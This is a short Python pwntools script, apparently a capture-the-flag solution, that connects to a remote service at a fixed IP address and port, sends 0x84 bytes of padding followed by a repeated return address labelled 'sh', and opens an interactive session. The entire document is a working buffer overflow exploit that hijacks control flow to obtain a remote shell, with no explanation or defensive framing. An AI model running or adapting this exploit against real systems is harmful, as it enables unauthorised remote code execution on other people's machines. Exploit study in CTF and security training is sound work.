from pwn import *

r = remote('104.154.106.182', 2345)

sh = 0x080484ad

r.recvuntil(': ')
r.sendline('a' * 0x84 + p32(sh)*10)
r.recvuntil('\n')
r.interactive()
